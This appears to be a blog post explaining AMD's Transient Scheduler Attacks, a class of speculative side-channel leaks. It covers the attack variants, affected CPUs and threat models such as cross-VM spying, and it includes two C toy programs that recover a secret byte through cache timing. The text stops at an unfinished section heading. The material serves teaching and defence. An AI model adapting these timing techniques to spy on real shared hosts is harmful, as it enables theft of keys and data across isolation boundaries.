<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
<p><strong>Transient Scheduler Attacks (TSA)</strong> – a fresh class of speculative side-channel leaks in AMD CPUs, abusing the <em>instruction scheduler</em> itself.</p>
</blockquote>
<p>If Spectre was about mispredicted branches and Meltdown about rogue loads, TSA is about <strong>“false completions”</strong>: the CPU momentarily believes a load has finished and forwards <em>invalid</em> data into dependent instructions. That data isn’t architecturally visible—but it <em>does</em> change how long later instructions take to execute, and those timing differences leak information across privilege boundaries.</p>
<p>In this post, we’ll unpack TSA from a red-team mindset:</p>
<ul>
<li>What TSA actually is (minus marketing),</li>
<li>How an attacker could <em>conceptually</em> exploit it,</li>
<li>A tiny lab you can build to “feel” this class of leak,</li>
<li>And what defenders should do before their schedulers start talking.</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">1. Quick refresher: speculative execution &amp; side-channels</h2><a id="user-content-1-quick-refresher-speculative-execution--side-channels" class="anchor" aria-label="Permalink: 1. Quick refresher: speculative execution &amp; side-channels" href="#1-quick-refresher-speculative-execution--side-channels"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Modern CPUs are performance junkies. They:</p>
<ul>
<li>
<strong>Speculatively execute</strong> instructions before they’re 100% sure they’re needed (branch prediction, memory prediction, etc.).</li>
<li>
<strong>Out-of-order schedule</strong> instructions to keep execution units busy.</li>
<li>
<strong>Forward data</strong> between loads and stores without waiting for the full memory pipeline.</li>
</ul>
<p>Most of the time, that works great. Occasionally, it creates <strong>transient states</strong> where:</p>
<ol>
<li>The CPU does some work based on <em>guessed</em> information,</li>
<li>Later realizes it guessed wrong,</li>
<li>Rolls back the architectural state…</li>
<li>But the <strong>microarchitectural state</strong> (caches, predictors, queues, timing) still remembers what happened.</li>
</ol>
<p>Classic attacks:</p>
<ul>
<li>
<strong>Spectre</strong>: abuse branch prediction → transiently execute code that touches secret-dependent memory → leak via cache timing.</li>
<li>
<strong>Meltdown / Foreshadow / MDS</strong>: abuse permission checks and internal buffers to read data across isolation boundaries.</li>
</ul>
<p>TSA is the same story <em>one layer deeper</em>: not the branch predictor, not the cache hierarchy, but the <strong>scheduler and its perception of whether a load is “done.”</strong></p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">2. What AMD calls “Transient Scheduler Attacks”</h2><a id="user-content-2-what-amd-calls-transient-scheduler-attacks" class="anchor" aria-label="Permalink: 2. What AMD calls “Transient Scheduler Attacks”" href="#2-what-amd-calls-transient-scheduler-attacks"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s 2025 security bulletin and technical whitepaper describe TSA as a new speculative side channel that appears when certain <strong>load instructions experience “false completion.”</strong></p>
<div class="markdown-heading"><h3 class="heading-element">2.1 False completions in a nutshell</h3><a id="user-content-21-false-completions-in-a-nutshell" class="anchor" aria-label="Permalink: 2.1 False completions in a nutshell" href="#21-false-completions-in-a-nutshell"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Under specific timing and microarchitectural conditions:</p>
<ol>
<li>A load instruction is expected to hit in a fast structure (e.g., L1 cache).</li>
<li>Hardware <em>optimistically</em> assumes the data will be ready quickly.</li>
<li>Dependent operations get scheduled based on that assumption.</li>
<li>But something goes wrong – the load <em>didn’t</em> actually complete (it missed in L1, or the store data isn’t ready, etc.).</li>
<li>The CPU forwards <strong>invalid data</strong> to dependent instructions temporarily.</li>
<li>The load is later re-executed with the correct data, and dependents re-run.</li>
</ol>
<p>Crucially:</p>
<ul>
<li>You don’t get a pipeline flush like some other transient behaviors.</li>
<li>That invalid data <strong>doesn’t update caches or TLBs</strong>, so you can’t see it with classic cache-based side-channels.</li>
<li>But the invalid data <em>does</em> influence the <strong>timing</strong> of other instructions in the core, and that timing is observable.</li>
</ul>
<p>Hence: <strong>Transient Scheduler Attacks</strong> – you leak data by watching how the scheduler behaves when it has been lied to.</p>
<div class="markdown-heading"><h3 class="heading-element">2.2 Two main variants: TSA-L1 and TSA-SQ</h3><a id="user-content-22-two-main-variants-tsa-l1-and-tsa-sq" class="anchor" aria-label="Permalink: 2.2 Two main variants: TSA-L1 and TSA-SQ" href="#22-two-main-variants-tsa-l1-and-tsa-sq"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD’s technical guidance splits TSA into two sub-variants:</p>
<ul>
<li>
<p><strong>TSA-L1 (L1 data cache variant)</strong></p>
<ul>
<li>Modern AMD cores use a <strong>microtag</strong> structure to accelerate L1 lookups.</li>
<li>In some edge cases, the microtag says “hit” when the real L1 line isn’t there.</li>
<li>The load experiences a false completion and receives invalid data from whatever was associated with that microtag entry.</li>
<li>An attacker who can repeatedly engineer this state can infer <strong>what’s in the L1 cache</strong>, even if it belongs to:
<ul>
<li>OS kernel vs user process,</li>
<li>Hypervisor vs guest VM,</li>
<li>One VM vs another.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>TSA-SQ (store queue variant)</strong></p>
<ul>
<li>The store queue tracks in-flight stores and sometimes forwards their data to matching loads (<strong>Store-To-Load Forwarding</strong>).</li>
<li>In some timing windows, a load that matches an older store may see a false completion where invalid data comes from a <em>previous</em> occupant of that store-queue entry.</li>
<li>An attacker may infer data from older stores—potentially across kernel/user boundaries—but cross-VM leakage here appears more limited.</li>
</ul>
</li>
</ul>
<p>So TSA-L1 is your <strong>“peek into L1 from another context”</strong> scenario, whereas TSA-SQ is more like <strong>“see what older stores were doing”</strong> if you can hit the timing window.</p>
<div class="markdown-heading"><h3 class="heading-element">2.3 Affected CPUs &amp; severity</h3><a id="user-content-23-affected-cpus--severity" class="anchor" aria-label="Permalink: 2.3 Affected CPUs &amp; severity" href="#23-affected-cpus--severity"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<ul>
<li>TSA affects <strong>AMD Family 19h</strong> processors (Zen 3 / Zen 4 class parts, including EPYC and Ryzen families).</li>
<li>Individual CVEs are rated in the “medium” band, but collectively TSA is treated as a <strong>speculative side-channel class</strong> that can leak data across privilege boundaries.</li>
<li>AMD is shipping <strong>microcode updates</strong> plus OS/hypervisor guidance; the Linux kernel added a dedicated <code>MITIGATION_TSA</code> config option and a <code>tsa=</code> boot parameter to toggle mitigation strategies.</li>
</ul>
<p>In other words: TSA isn’t “you can RCE the CPU via JavaScript,” but it <em>is</em> “if an attacker can run code on the same CPU, they may spy on higher-privileged contexts.”</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">3. How would an attacker actually abuse TSA?</h2><a id="user-content-3-how-would-an-attacker-actually-abuse-tsa" class="anchor" aria-label="Permalink: 3. How would an attacker actually abuse TSA?" href="#3-how-would-an-attacker-actually-abuse-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>From a red-team point of view, TSA is about <strong>turning local code execution into a powerful side-channel primitive</strong>.</p>
<p>AMD is quite explicit about preconditions:</p>
<blockquote>
<p>TSA is likely only exploitable if the attacker can run arbitrary code on the machine and can repeatedly trigger victim activity to build up a measurable signal.</p>
</blockquote>
<p>So think <strong>“post-compromise escalation / stealth data theft”</strong>, not “remote drive-by.”</p>
<div class="markdown-heading"><h3 class="heading-element">3.1 Threat models that actually make sense</h3><a id="user-content-31-threat-models-that-actually-make-sense" class="anchor" aria-label="Permalink: 3.1 Threat models that actually make sense" href="#31-threat-models-that-actually-make-sense"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Some realistic scenarios:</p>
<ol>
<li>
<p><strong>Malicious VM in a public cloud</strong></p>
<ul>
<li>You rent a VM on a shared EPYC host.</li>
<li>You arrange your workload so that:
<ul>
<li>Your VM executes carefully crafted load/store sequences, trying to create false completions,</li>
<li>You constantly measure timing of your own code,</li>
<li>You synchronize with a high-value victim VM (e.g., by hitting its web API, causing it to perform sensitive operations repeatedly).</li>
</ul>
</li>
<li>Over many iterations, you try to reconstruct bits of secrets used in the victim: crypto keys, keystroke patterns, or data-dependent control paths.</li>
</ul>
</li>
<li>
<p><strong>Untrusted plugin / extension in a multi-tenant app</strong></p>
<ul>
<li>Think: a plugin system where tenants can upload native or WASM modules and get CPU time on the same host as privileged code.</li>
<li>The plugin runs malicious code that tries to observe kernel or hypervisor behavior via TSA-style timing leaks, especially across system calls or hypercalls.</li>
</ul>
</li>
<li>
<p><strong>Malware on a bare-metal server</strong></p>
<ul>
<li>Traditional malware already has local execution.</li>
<li>TSA gives it a way to break isolation between:
<ul>
<li>Normal user processes and privileged daemons,</li>
<li>Or between containers that happen to share cores.</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>In <em>all</em> these cases, TSA doesn’t give you code execution; it gives you a <strong>new, stealthy information-leak channel</strong> once you’re on the box.</p>
<div class="markdown-heading"><h3 class="heading-element">3.2 What does “exploitation” look like?</h3><a id="user-content-32-what-does-exploitation-look-like" class="anchor" aria-label="Permalink: 3.2 What does “exploitation” look like?" href="#32-what-does-exploitation-look-like"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>High-level exploitation strategy (similar in spirit to other speculative side channels):</p>
<ol>
<li>
<p><strong>Prime microarchitectural state</strong></p>
<ul>
<li>Arrange L1 cache or store queue to contain patterns that encode guesses about victim data (or vice versa).</li>
</ul>
</li>
<li>
<p><strong>Trigger victim computation</strong></p>
<ul>
<li>System call, network request, hypercall—anything that causes the victim to touch sensitive data.</li>
<li>Repeat this many times so you can average out noise.</li>
</ul>
</li>
<li>
<p><strong>Force false completions</strong></p>
<ul>
<li>Using carefully chosen addresses and instruction sequences, steer certain victim or attacker loads into the microtag / store-queue corner cases described in TSA-L1 and TSA-SQ.</li>
</ul>
</li>
<li>
<p><strong>Measure timing in attacker context</strong></p>
<ul>
<li>The invalid forwarded data doesn’t leak directly, but it changes how long later instructions take to execute.</li>
<li>By correlating timing patterns with what you know you primed, you infer bits of secret state in the victim’s cache lines or stores.</li>
</ul>
</li>
<li>
<p><strong>Do this… a lot</strong></p>
<ul>
<li>TSA is noisy. You typically need many victim invocations to create a measurable signal.</li>
</ul>
</li>
</ol>
<p>If that sounds abstract, that’s because it is—<strong>real TSA exploitation is non-trivial</strong>. But you can build a lab to internalize the shape of the attack.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">4. A tiny lab to “feel” scheduler-style leaks (with code)</h2><a id="user-content-4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code" class="anchor" aria-label="Permalink: 4. A tiny lab to “feel” scheduler-style leaks (with code)" href="#4-a-tiny-lab-to-feel-scheduler-style-leaks-with-code"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>We’re still <strong>not</strong> reproducing TSA itself (that’s complex research), but we can build a lab that:</p>
<ul>
<li>Shows how <strong>secret-dependent memory access → timing difference → information leak</strong> works, and</li>
<li>Uses patterns similar to what real speculative / transient attacks exploit.</li>
</ul>
<p>Think of this as a <strong>Flush+Reload / cache timing 101</strong> exercise that warms people up conceptually for TSA.</p>
<blockquote>
<p><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> Educational only. Run this only on machines you own. Don’t point this at shared environments you don’t control.</p>
</blockquote>
<div class="markdown-heading"><h3 class="heading-element">4.1 Full toy example: secret-dependent access + timing</h3><a id="user-content-41-full-toy-example-secret-dependent-access--timing" class="anchor" aria-label="Permalink: 4.1 Full toy example: secret-dependent access + timing" href="#41-full-toy-example-secret-dependent-access--timing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>This is a self-contained C toy that:</p>
<ul>
<li>Has a “secret” byte,</li>
<li>A victim function that touches memory depending on that secret,</li>
<li>An attacker that measures which memory line is “hot” by timing loads with <code>rdtsc</code>.</li>
</ul>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy tsa_toy.c</span>
<span class="pl-c">// Simple educational cache timing demo:</span>
<span class="pl-c">//  - victim_operation() uses a secret-dependent index</span>
<span class="pl-c">//  - attacker measures which index is fastest to infer the secret</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for __rdtscp, _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096      // ensure different cache lines
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-c">// Shared array used as our "probe" for timing</span>
<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

<span class="pl-c">// Fake secret we want to "leak"</span>
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x42</span>;  <span class="pl-c">// 66 decimal</span>

<span class="pl-c">// Victim: uses attacker-controlled hint, mixed with secret, to pick an index</span>
<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;  <span class="pl-c">// secret-dependent index</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-c">// Load from secret-dependent location</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;

    <span class="pl-c">// Prevent the compiler from optimizing away the load</span>
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-c">// Flush entire probe_array from caches</span>
<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-c">// Measure time to access probe_array[idx * STRIDE]</span>
<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
